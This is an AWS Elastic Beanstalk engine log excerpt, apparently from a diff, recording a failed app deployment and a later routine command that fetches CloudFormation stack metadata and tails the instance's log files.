+2026/04/23 07:00:35.634726 [INFO] Executing cleanup logic
+2026/04/23 07:00:35.634814 [INFO] CommandService Response: {"status":"FAILURE","api_version":"1.0","results":[{"status":"FAILURE","msg":"Engine execution has encountered an error.","returncode":1,"events":[{"msg":"Instance deployment failed. For details, see 'eb-engine.log'.","timestamp":1776927635634,"severity":"ERROR"}]}]}
+
+2026/04/23 07:00:35.663620 [INFO] Platform Engine finished execution on command: app-deploy
+
+2026/04/23 07:01:49.301102 [INFO] Starting...
+2026/04/23 07:01:49.301150 [INFO] Starting EBPlatform-PlatformEngine
+2026/04/23 07:01:49.301170 [INFO] reading event message file
+2026/04/23 07:01:49.301516 [INFO] Engine received EB command cfn-hup-exec
+
+2026/04/23 07:01:49.381483 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:ap-northeast-2:376798132745:stack/awseb-e-jtq2v3kzrt-stack/924a2a30-3df2-11f1-916c-06bc62a629a9 -r AWSEBAutoScalingGroup --region ap-northeast-2
+2026/04/23 07:01:49.697545 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:ap-northeast-2:376798132745:stack/awseb-e-jtq2v3kzrt-stack/924a2a30-3df2-11f1-916c-06bc62a629a9 -r AWSEBBeanstalkMetadata --region ap-northeast-2
+2026/04/23 07:01:50.001619 [INFO] checking whether command tail-log is applicable to this instance...
+2026/04/23 07:01:50.001634 [INFO] this command is applicable to the instance, thus instance should execute command
+2026/04/23 07:01:50.001639 [INFO] Engine command: (tail-log)
+
+2026/04/23 07:01:50.001694 [INFO] Executing instruction: GetTailLogs
+2026/04/23 07:01:50.001697 [INFO] Tail Logs...
+2026/04/23 07:01:50.002105 [INFO] Running command: tail -n 100 /var/log/eb-hooks.log
+2026/04/23 07:01:50.004246 [INFO] Running command: tail -n 100 /var/log/nginx/access.log
+2026/04/23 07:01:50.006205 [INFO] Running command: tail -n 100 /var/log/nginx/error.log
+2026/04/23 07:01:50.009904 [INFO] Running command: tail -n 100 /var/log/web.stdout.log
+2026/04/23 07:01:50.012190 [INFO] Running command: tail -n 100 /var/log/eb-engine.log
+
+
